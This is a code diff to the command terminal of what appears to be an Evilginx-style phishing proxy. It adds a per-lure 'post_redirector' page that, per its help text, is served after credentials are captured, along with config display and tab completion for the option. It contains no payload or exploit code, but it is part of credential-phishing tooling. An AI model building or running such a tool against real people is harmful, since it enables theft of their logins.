@@ -234,6 +234,7 @@ func (t *Terminal) handleConfig(args []string) error {
 		lureStrategy := t.cfg.GetLureGenerationStrategy()
 
 		redirectorsDir := t.cfg.GetRedirectorsDir()
+		postRedirectorsDir := t.cfg.GetPostRedirectorsDir()
 
 		domainsSummary := t.cfg.GetBaseDomain()
 		if domainsSummary == "" {
@@ -246,8 +247,8 @@ func (t *Terminal) handleConfig(args []string) error {
 			domainsSummary += " (use 'domains' command to manage)"
 		}
 		webAdminUrl := fmt.Sprintf("http://127.0.0.1:%d", t.cfg.GetWebAdminPort())
-		keys := []string{"domains", "external_ipv4", "bind_ipv4", "http_port", "https_port", "dns_port", "unauth_url", "autocert", "redirectors_dir", "lure_strategy", "web_admin_url", "gophish integrated_admin_url", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
-		vals := []string{domainsSummary, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, redirectorsDir, lureStrategy, webAdminUrl, t.cfg.GetGoPhishIntegratedAdminUrl(), t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
+		keys := []string{"domains", "external_ipv4", "bind_ipv4", "http_port", "https_port", "dns_port", "unauth_url", "autocert", "redirectors_dir", "post_redirectors_dir", "lure_strategy", "web_admin_url", "gophish integrated_admin_url", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
+		vals := []string{domainsSummary, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, redirectorsDir, postRedirectorsDir, lureStrategy, webAdminUrl, t.cfg.GetGoPhishIntegratedAdminUrl(), t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -2589,6 +2590,24 @@ func (t *Terminal) handleLures(args []string) error {
 					}
 					do_update = true
 					log.Info("redirector = '%s'", l.Redirector)
+				case "post_redirector":
+					if val != "" {
+						path := val
+						if !filepath.IsAbs(val) {
+							redirectors_dir := t.cfg.GetPostRedirectorsDir()
+							path = filepath.Join(redirectors_dir, val)
+						}
+
+						if _, err := os.Stat(path); !os.IsNotExist(err) {
+							l.PostRedirector = val
+						} else {
+							return fmt.Errorf("edit: post_redirector directory does not exist: %s", path)
+						}
+					} else {
+						l.PostRedirector = ""
+					}
+					do_update = true
+					log.Info("post_redirector = '%s'", l.PostRedirector)
 				case "ua_filter":
 					if val != "" {
 						if _, err := regexp.Compile(val); err != nil {
@@ -2677,8 +2696,8 @@ func (t *Terminal) handleLures(args []string) error {
 
 			var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))
 
-			keys := []string{"phishlet", "hostname", "path", "redirector", "ua_filter", "redirect_url", "paused", "info", "og_title", "og_desc", "og_image", "og_url"}
-			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), s_paused, l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl)}
+			keys := []string{"phishlet", "hostname", "path", "redirector", "post_redirector", "ua_filter", "redirect_url", "paused", "info", "og_title", "og_desc", "og_image", "og_url"}
+			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), white.Sprint(l.PostRedirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), s_paused, l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl)}
 			log.Printf("\n%s\n", AsRows(keys, vals))
 
 			return nil
@@ -3322,7 +3341,7 @@ func (t *Terminal) createHelp() {
 
 	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
 		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
-			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)))),
+			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)), readline.PcItem("post_redirector", readline.PcItemDynamic(t.postRedirectorsPrefixCompleter)))),
 			readline.PcItem("delete", readline.PcItem("all"))))
 
 	h.AddSubCommand("lures", nil, "", "show all create lures")
@@ -3336,7 +3355,8 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("lures", []string{"unpause"}, "unpause <id>", "unpause lure <id> and make it available again")
 	h.AddSubCommand("lures", []string{"edit", "hostname"}, "edit <id> hostname <hostname>", "sets custom phishing <hostname> for a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"edit", "path"}, "edit <id> path <path>", "sets custom url <path> for a lure with a given <id>")
-	h.AddSubCommand("lures", []string{"edit", "redirector"}, "edit <id> redirector <path>", "sets an html redirector directory <path> for a lure with a given <id>")
+	h.AddSubCommand("lures", []string{"edit", "redirector"}, "edit <id> redirector <path>", "sets an html redirector directory <path> shown before the phishing page, for a lure with a given <id>")
+	h.AddSubCommand("lures", []string{"edit", "post_redirector"}, "edit <id> post_redirector <path>", "sets an html redirector directory <path> served after credentials are captured (before final redirect), for a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"edit", "ua_filter"}, "edit <id> ua_filter <regexp>", "sets a regular expression user-agent whitelist filter <regexp> for a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"edit", "redirect_url"}, "edit <id> redirect_url <redirect_url>", "sets redirect url that user will be navigated to on successful authorization, for a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"edit", "phishlet"}, "edit <id> phishlet <phishlet>", "change the phishlet, the lure with a given <id> applies to")
@@ -3716,6 +3736,36 @@ func (t *Terminal) sprintLures() string {
 
 func (t *Terminal) phishletPrefixCompleter(args string) []string {
 	return t.cfg.GetPhishletNames()
+}
+
+func (t *Terminal) postRedirectorsPrefixCompleter(args string) []string {
+	dir := t.cfg.GetPostRedirectorsDir()
+
+	files, err := ioutil.ReadDir(dir)
+	if err != nil {
+		return []string{}
+	}
+	var ret []string
+	for _, f := range files {
+		if f.IsDir() {
+			index_path1 := filepath.Join(dir, f.Name(), "index.html")
+			index_path2 := filepath.Join(dir, f.Name(), "index.htm")
+			index_found := ""
+			if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
+				index_found = index_path1
+			} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
+				index_found = index_path2
+			}
+			if index_found != "" {
+				name := f.Name()
+				if strings.Contains(name, " ") {
+					name = "\"" + name + "\""
+				}
+				ret = append(ret, name)
+			}
+		}
+	}
+	return ret
 }
 
 func (t *Terminal) redirectorsPrefixCompleter(args string) []string {
